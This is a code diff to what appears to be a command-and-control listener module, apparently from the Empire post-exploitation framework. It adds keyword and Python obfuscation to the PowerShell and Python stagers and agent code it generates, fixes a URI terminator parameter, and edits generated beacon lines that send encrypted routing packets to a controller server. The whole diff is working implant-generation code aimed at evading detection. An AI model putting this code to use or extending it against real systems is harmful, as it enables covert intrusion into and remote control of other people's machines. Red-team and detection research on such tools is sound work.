@@ -449,6 +449,7 @@ class Listener(object):
                         launcherBase,
                         obfuscation_command=obfuscation_command,
                     )
+                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
                 if encode and (
                     (not obfuscate) or ("launcher" not in obfuscation_command.lower())
@@ -565,6 +566,10 @@ class Listener(object):
                 launcherBase += "a=urllib.request.urlopen(req).read();\n"
                 launcherBase += listener_util.python_extract_stager(stagingKey)
 
+                if obfuscate:
+                    stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
                 if encode:
                     launchEncoded = base64.b64encode(
                         launcherBase.encode("UTF-8")
@@ -665,25 +670,24 @@ class Listener(object):
             )
 
             stagingKey = stagingKey.encode("UTF-8")
-            unobfuscated_stager = listener_util.remove_lines_comments(
-                comms_code + stager
-            )
+            stager = listener_util.remove_lines_comments(comms_code + stager)
 
             if obfuscate:
-                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
-                    unobfuscated_stager,
+                stager = self.mainMenu.obfuscationv2.obfuscate(
+                    stager,
                     obfuscation_command=obfuscation_command,
                 )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
-                return helpers.enc_powershell(unobfuscated_stager)
+                return helpers.enc_powershell(stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
+                    RC4IV + stagingKey, stager.encode("UTF-8")
                 )
             else:
-                return unobfuscated_stager
+                return stager
 
         elif language.lower() == "python":
             comms_code = self.generate_comms(
@@ -710,6 +714,10 @@ class Listener(object):
 
             stager = template.render(template_options)
             stager = stager.replace("REPLACE_COMMS", comms_code)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
                 return base64.b64encode(stager)
@@ -795,6 +803,8 @@ class Listener(object):
                     code,
                     obfuscation_command=obfuscation_command,
                 )
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
+
             return code
 
         elif language == "python":
@@ -829,6 +839,10 @@ class Listener(object):
                 code = code.replace(
                     'workingHours = ""', f'workingHours = "{ workingHours }"'
                 )
+
+            if obfuscate:
+                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
         else:
@@ -910,7 +924,7 @@ $script:GetTask = {{
                 ):
                     getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                     first = False
-                    getTask += f"$taskURI += '{ profile.get.client.metadata.terminator.name }=' + $RoutingPacket;"
+                    getTask += f"$taskURI += '{ profile.get.client.metadata.terminator.arg }=' + $RoutingPacket;"
 
                 if (
                     profile.get.client.metadata.terminator.type
@@ -1104,8 +1118,10 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 sendMessage += "    if packets:\n"
 
                 # ==== BUILD ROUTING PACKET ====
-                sendMessage += "        encData = aes_encrypt_then_hmac(key, packets)\n"
-                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)\n"
+                sendMessage += (
+                    "        encData = aes_encrypt_then_hmac(key, packets);\n"
+                )
+                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData);\n"
                 sendMessage += (
                     "\n".join(
                         [
@@ -1139,7 +1155,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                     sendMessage += (
                         "        parameters['"
                         + profile.post.client.output.terminator.arg
-                        + "'] = routingPacket\n"
+                        + "'] = routingPacket;\n"
                     )
                 sendMessage += "        if parameters:\n"
                 sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"
@@ -1183,7 +1199,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 sendMessage += "    else:\n"
 
                 # ==== BUILD ROUTING PACKET
-                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)\n"
+                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4);\n"
                 sendMessage += (
                     "\n".join(
                         [
@@ -1202,7 +1218,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                     + str(profile.get.client.uris)
                     + ", 1)[0]\n"
                 )
-                sendMessage += "        requestUri = server + taskUri\n"
+                sendMessage += "        requestUri = server + taskUri;\n"
 
                 # ==== ADD PARAMETERS ====
                 sendMessage += "        parameters = {}\n"
@@ -1226,7 +1242,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                     profile.get.client.metadata.terminator.type
                     == malleable.Terminator.URIAPPEND
                 ):
-                    sendMessage += "        requestUri += routingPacket\n"
+                    sendMessage += "        requestUri += routingPacket;\n"
 
                 # ==== ADD BODY ====
                 if (
@@ -1259,7 +1275,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
 
                 # ==== SEND REQUEST ====
                 sendMessage += "    try:\n"
-                sendMessage += "        res = urllib.request.urlopen(req)\n"
+                sendMessage += "        res = urllib.request.urlopen(req);\n"
 
                 # ==== EXTRACT RESPONSE ====
                 if (
@@ -1295,7 +1311,7 @@ Start-Negotiate -S '$ser' -SK $SK -UA $ua;
                 )
                 # before return we encode to bytes, since in some transformations "join" produces str
                 sendMessage += (
-                    "        if isinstance(data,str): data = data.encode('latin-1')\n"
+                    "        if isinstance(data,str): data = data.encode('latin-1');\n"
                 )
                 sendMessage += "        return ('200', data)\n"
 
